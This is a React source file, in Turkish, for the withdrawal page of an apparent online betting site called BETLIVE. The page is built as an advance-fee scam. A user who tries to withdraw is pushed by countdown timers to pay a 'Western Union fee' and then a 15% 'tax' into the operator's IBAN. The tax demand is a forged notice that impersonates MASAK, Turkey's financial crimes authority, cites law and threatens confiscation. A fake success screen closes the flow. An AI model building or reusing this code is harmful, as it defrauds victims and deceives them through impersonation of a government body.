import { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { useAuth } from '../../context/AuthContext';
import { Card, CardContent } from '../../components/ui/card';
import { Button } from '../../components/ui/button';
import { Input } from '../../components/ui/input';
import { Label } from '../../components/ui/label';
import { toast } from 'sonner';
import { Globe, Shield, Clock, CheckCircle, AlertTriangle, Copy, Building } from 'lucide-react';

const API = `${process.env.REACT_APP_BACKEND_URL}/api`;

const UserWithdraw = () => {
  const { refreshUser } = useAuth();
  const [step, setStep] = useState('loading'); // loading, iban_form, western_pending, western_payment, masak_pending, masak_payment, reviewing, completed
  const [balance, setBalance] = useState(0);
  const [settings, setSettings] = useState(null);
  const [timer, setTimer] = useState(1800); // 30 minutes
  const [formData, setFormData] = useState({
    iban: '',
    bank_name: '',
    iban_holder: ''
  });
  const [userInfo, setUserInfo] = useState(null);

  const fetchStatus = useCallback(async () => {
    try {
      const response = await axios.get(`${API}/user/withdrawal-status`);
      const data = response.data;
      setBalance(data.balance);
      setSettings(data.settings);
      setUserInfo(data);
      
      if (data.iban) {
        setFormData({
          iban: data.iban,
          bank_name: data.bank_name || '',
          iban_holder: data.iban_holder || ''
        });
      }

      // Determine current step based on withdrawal_status
      switch (data.status) {
        case 'western_pending':
          setStep('western_payment');
          break;
        case 'western_paid':
          setStep('masak_pending');
          break;
        case 'masak_pending':
          setStep('masak_payment');
          break;
        case 'masak_paid':
          setStep('reviewing');
          break;
        case 'reviewing':
          setStep('reviewing');
          break;
        case 'completed':
          setStep('completed');
          break;
        default:
          setStep('iban_form');
      }
    } catch (error) {
      console.error('Status fetch error:', error);
      setStep('iban_form');
    }
  }, []);

  useEffect(() => {
    fetchStatus();
  }, [fetchStatus]);

  useEffect(() => {
    let interval;
    if (['western_payment', 'masak_payment'].includes(step) && timer > 0) {
      interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [step, timer]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleIbanSubmit = async (e) => {
    e.preventDefault();
    if (!formData.iban || !formData.bank_name || !formData.iban_holder) {
      toast.error('Tüm alanları doldurun');
      return;
    }
    try {
      await axios.post(`${API}/user/withdraw`, formData);
      toast.success('Çekim talebi oluşturuldu');
      setStep('western_payment');
      setTimer(1800);
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const handleWesternPayment = async () => {
    try {
      await axios.post(`${API}/user/western-union-payment`);
      toast.success('Western Union ödeme kaydı oluşturuldu');
      setStep('masak_pending');
      setTimer(1800);
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const handleMasakPayment = async () => {
    try {
      await axios.post(`${API}/user/masak-payment`);
      toast.success('MASAK ödeme kaydı oluşturuldu');
      setStep('reviewing');
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const handleComplete = async () => {
    try {
      await axios.post(`${API}/user/complete-withdrawal`);
      toast.success('İşlem tamamlandı!');
      setStep('completed');
      refreshUser();
    } catch (error) {
      toast.error('İşlem başarısız');
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success('Kopyalandı!');
  };

  const westernFee = balance * 0.075;
  const masakFee = balance * 0.15;
  const masakBonus = balance * 0.35;
  const totalWithBonus = balance + masakBonus;

  // Loading State
  if (step === 'loading') {
    return (
      <div className="flex items-center justify-center min-h-96">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-gold-500"></div>
      </div>
    );
  }

  // IBAN Form Step
  if (step === 'iban_form') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-iban-form">
        <div className="text-center">
          <h1 className="font-chivo font-black text-3xl text-white mb-2">PARA ÇEKME</h1>
          <p className="text-zinc-400">Çekim yapılacak banka bilgilerinizi girin</p>
        </div>

        <Card className="bg-zinc-900/70 border-zinc-800">
          <CardContent className="p-6">
            <div className="mb-6 p-4 bg-gold-500/10 border border-gold-500/30 rounded-lg">
              <p className="text-gold-500 font-semibold text-center">
                Çekilecek Tutar: <span className="font-mono text-2xl">{balance.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
              </p>
            </div>

            <form onSubmit={handleIbanSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label className="text-zinc-300">Alıcı Adı Soyadı</Label>
                <Input
                  data-testid="withdraw-iban-holder"
                  value={formData.iban_holder}
                  onChange={(e) => setFormData({ ...formData, iban_holder: e.target.value })}
                  className="bg-zinc-800 border-zinc-700 text-white"
                  placeholder="Ad Soyad"
                  required
                />
              </div>
              <div className="space-y-2">
                <Label className="text-zinc-300">Banka Adı</Label>
                <Input
                  data-testid="withdraw-bank-name"
                  value={formData.bank_name}
                  onChange={(e) => setFormData({ ...formData, bank_name: e.target.value })}
                  className="bg-zinc-800 border-zinc-700 text-white"
                  placeholder="Banka adı"
                  required
                />
              </div>
              <div className="space-y-2">
                <Label className="text-zinc-300">IBAN Numarası</Label>
                <Input
                  data-testid="withdraw-iban"
                  value={formData.iban}
                  onChange={(e) => setFormData({ ...formData, iban: e.target.value })}
                  className="bg-zinc-800 border-zinc-700 text-white font-mono"
                  placeholder="TR00 0000 0000 0000 0000 0000 00"
                  required
                />
              </div>
              <Button
                type="submit"
                data-testid="withdraw-submit-btn"
                className="w-full bg-green-600 hover:bg-green-700 text-white font-bold h-12"
              >
                ÇEKİM TALEBİ OLUŞTUR
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Western Union Payment Step
  if (step === 'western_payment') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-western">
        {/* Timer Bar */}
        <div className="bg-red-600 text-white py-3 text-center font-bold rounded-t-lg">
          KALAN SÜRE: {formatTime(timer)}
        </div>

        <Card className="bg-white text-black overflow-hidden rounded-b-lg rounded-t-none">
          {/* Header */}
          <div className="bg-gradient-to-r from-yellow-400 to-yellow-500 py-4 px-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm">Alıcı Adı Soyadı:</p>
                <p className="font-bold">{formData.iban_holder}</p>
              </div>
              <div className="text-right">
                <p className="text-sm">Kayıtlı IBAN:</p>
                <p className="font-mono font-bold">{formData.iban}</p>
              </div>
            </div>
          </div>

          <CardContent className="p-6 space-y-4">
            <div className="flex justify-between">
              <span>Çekim Tutarı:</span>
              <span className="font-mono font-bold">{balance.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
            </div>
            <div className="flex justify-between text-red-600">
              <span>Western Union İşlem Ücreti (%7.5):</span>
              <span className="font-mono font-bold">{westernFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
            </div>

            <div className="border-t border-dashed border-gray-300 pt-4">
              <div className="text-center">
                <p className="text-gray-500 text-sm">ÖDEMENİZ GEREKEN TUTAR</p>
                <p className="font-mono font-bold text-4xl text-cyan-500">{westernFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</p>
              </div>
            </div>

            <div className="bg-cyan-50 border border-cyan-200 rounded-lg p-4">
              <p className="text-red-600 font-semibold text-sm flex items-center gap-2">
                <AlertTriangle className="h-4 w-4" />
                İşlem tutarınızı ({westernFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL) yukarıdaki sayaç dolmadan (30 Dakika) ödemeniz gerekmektedir. Aksi takdirde işleminiz otomatik olarak iptal edilecektir.
              </p>
            </div>

            {/* Payment Info */}
            <div className="bg-cyan-100 rounded-lg p-4 text-center space-y-2">
              <p className="text-cyan-700 font-semibold">ÖDEME YAPILACAK HESAP BİLGİLERİ</p>
              <p className="font-bold">{settings?.iban_holder}</p>
              <p className="text-gray-600">{settings?.bank_name}</p>
              <p className="font-bold">{settings?.iban}</p>
              <Button
                onClick={() => copyToClipboard(settings?.iban)}
                variant="outline"
                size="sm"
                className="mt-2 border-cyan-500 text-cyan-700"
              >
                <Copy className="h-4 w-4 mr-2" /> IBAN'ı Kopyala
              </Button>
            </div>

            <div className="text-center text-red-600 font-semibold text-sm">
              <AlertTriangle className="h-4 w-4 inline mr-1" />
              UYARI: Ödeme yapmadan aşağıdaki tuşa basarsanız işleminiz kalıcı olarak iptal edilecektir!
            </div>

            <Button
              onClick={handleWesternPayment}
              data-testid="western-payment-btn"
              className="w-full bg-green-600 hover:bg-green-700 text-white font-bold h-14 text-lg"
            >
              ÖDEME YAPTIM
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // MASAK Pending / Payment Step
  if (step === 'masak_pending' || step === 'masak_payment') {
    return (
      <div className="max-w-2xl mx-auto space-y-6" data-testid="withdraw-masak">
        {/* Timer Bar */}
        <div className="bg-red-600 text-white py-3 text-center font-bold rounded-lg">
          KALAN SÜRE: {formatTime(timer)}
        </div>

        {/* MASAK Header */}
        <Card className="bg-red-700 text-white overflow-hidden">
          <CardContent className="p-6 text-center">
            <Building className="h-12 w-12 mx-auto mb-4" />
            <h2 className="font-chivo font-black text-2xl mb-2">T.C. MALİ SUÇLARI ARAŞTIRMA KURULU</h2>
            <p className="text-red-200 text-sm">ULUSLARARASI FON TRANSFERİ DENETİM BİRİMİ</p>
          </CardContent>
        </Card>

        {/* MASAK Document */}
        <Card className="bg-white text-black">
          <CardContent className="p-6 space-y-4">
            <div className="text-right text-sm text-gray-500">
              REF: MSK-2025/{Math.floor(Math.random() * 90000) + 10000}-TR
            </div>

            <div className="prose prose-sm max-w-none">
              <p>Sayın <strong>{formData.iban_holder}</strong>,</p>
              <p>
                <strong>{formData.iban}</strong> IBAN numaralı şahsi hesabınıza, yurt dışı menşeli <strong>BETLIVE ANONİM A.Ş.</strong> tarafından gönderilen <strong className="text-red-600">{balance.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</strong> tutarındaki fon transferi, 5549 sayılı kanun ve MASAK mevzuatı gereğince sistemsel olarak <strong className="underline">"Transfer Havuzu"</strong>nda beklemeye alınmıştır.
              </p>
              <p>
                Mevcut mali düzenlemeler uyarınca, 100.000 TL limitini aşan yurt dışı kaynaklı para transferleri doğrudan vergilendirmeye tabidir. Bu işlem için tahakkuk eden yasal vergilendirme/blokaj kaldırma bedeli <strong className="text-red-600">{masakFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</strong> olarak hesaplanmıştır.
              </p>
              <p>
                İşbu ödemenin tarafınızca yapılması durumunda, bekleyen transfer tutarı havuzdan serbest bırakılarak <strong className="underline">anında</strong> banka hesabınıza aktarılacaktır. Ödeme yapılmaması veya işlemin reddi durumunda, ilgili tutar <strong className="text-red-600 underline">Devlet Hazinesine</strong> irad kaydedilerek yasal süreç başlatılacaktır.
              </p>
            </div>

            <div className="text-center text-xs text-gray-500 border-t border-gray-200 pt-4">
              Bu bildirim 5549 sayılı kanunun 19/A maddesi uyarınca elektronik ortamda tebliğ edilmiştir.
            </div>
          </CardContent>
        </Card>

        {/* MASAK Prosedürü */}
        <Card className="bg-white text-black">
          <CardContent className="p-6 space-y-4">
            <div className="flex items-center gap-2 mb-4">
              <Shield className="h-6 w-6" />
              <h3 className="font-bold text-xl">MASAK PROSEDÜRÜ</h3>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <p className="text-red-600 font-semibold">ÖNEMLİ DUYURU:</p>
              <p className="text-gray-700">
                Başınıza gelen talihsiz durumlardan dolayı bahis danışmanınız, bu ödemenizi çektikten sonraki aşamada sitemizde tekrar kupon yapabilmeniz için hesabınıza <strong className="text-green-600">{masakBonus.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL ÖZEL BONUS</strong> tanımlamıştır.
              </p>
            </div>

            <div className="border-2 border-dashed border-gray-300 rounded-lg p-4 text-center">
              <p className="text-gray-500 text-sm">YATIRMANIZ GEREKEN TUTAR (%15)</p>
              <p className="font-mono font-bold text-4xl text-cyan-500">{masakFee.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</p>
            </div>

            {/* Payment Info */}
            <div className="bg-gray-100 rounded-lg p-4 text-center space-y-2">
              <p className="font-semibold">ALICI:</p>
              <p className="font-bold">{settings?.iban_holder}</p>
              <p className="text-gray-600">BANKA: {settings?.bank_name}</p>
              <p className="text-gold-600 font-bold">IBAN: {settings?.iban}</p>
            </div>

            <div className="text-center text-red-600 font-semibold text-sm">
              <AlertTriangle className="h-4 w-4 inline mr-1" />
              Ödeme yapmadan bu tuşa basarsanız işleminiz kalıcı olarak iptal edilecektir!
            </div>

            <Button
              onClick={handleMasakPayment}
              data-testid="masak-payment-btn"
              className="w-full bg-green-600 hover:bg-green-700 text-white font-bold h-14 text-lg"
            >
              <Shield className="h-5 w-5 mr-2" /> MASAK'A ÖDEME YAP
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Reviewing Step
  if (step === 'reviewing') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-reviewing">
        <Card className="bg-zinc-900/70 border-zinc-800">
          <CardContent className="p-8 text-center">
            <Clock className="h-16 w-16 text-gold-500 mx-auto mb-4 animate-pulse" />
            <h2 className="font-chivo font-bold text-2xl text-white mb-4">İŞLEM İNCELENİYOR</h2>
            <p className="text-zinc-400 mb-6">
              Ödemeniz alınmıştır. İşleminiz kontrol ediliyor. 
              Lütfen bekleyiniz, kısa süre içinde sonuçlanacaktır.
            </p>
            <div className="bg-gold-500/10 border border-gold-500/30 rounded-lg p-4">
              <p className="text-gold-500">
                Toplam Aktarılacak Tutar: <span className="font-mono font-bold text-2xl">{totalWithBonus.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span>
              </p>
            </div>

            <Button
              onClick={handleComplete}
              data-testid="complete-withdrawal-btn"
              className="mt-6 bg-green-600 hover:bg-green-700 text-white font-bold h-12"
            >
              İşlemi Tamamla
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Completed Step
  if (step === 'completed') {
    return (
      <div className="max-w-lg mx-auto space-y-6" data-testid="withdraw-completed">
        <Card className="bg-gradient-to-br from-green-900/50 to-green-800/30 border-green-500/30">
          <CardContent className="p-8 text-center">
            <CheckCircle className="h-20 w-20 text-green-500 mx-auto mb-4" />
            <h2 className="font-chivo font-black text-3xl text-white mb-4">TEBRİKLER!</h2>
            <p className="text-zinc-300 text-lg mb-6">
              <span className="text-green-500 font-mono font-bold text-2xl">{totalWithBonus.toLocaleString('tr-TR', { minimumFractionDigits: 2 })} TL</span> tutarındaki çekim işleminiz başarıyla hesabınıza aktarılmıştır.
            </p>
            <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
              <p className="text-green-400 text-sm">
                İşlem referans numaranız: TRX-{Date.now().toString(36).toUpperCase()}
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  return null;
};

export default UserWithdraw;
